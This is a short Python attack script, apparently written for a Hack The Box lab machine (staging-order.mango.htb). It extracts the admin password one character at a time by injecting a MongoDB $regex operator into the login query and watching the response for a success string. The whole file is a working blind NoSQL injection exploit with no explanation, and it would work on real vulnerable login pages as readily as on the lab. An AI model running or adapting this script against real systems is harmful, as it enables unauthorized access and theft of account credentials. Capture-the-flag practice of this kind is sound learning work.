#!/usr/bin/env python 
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://staging-order.mango.htb/'

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|', '#', '&', '$']:
            payload='?username=%s&password[$regex]=%s' % (username, password + c)
            r = requests.get(u + payload)
            print(c)
            #print(payload)
            if 'Yeah' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
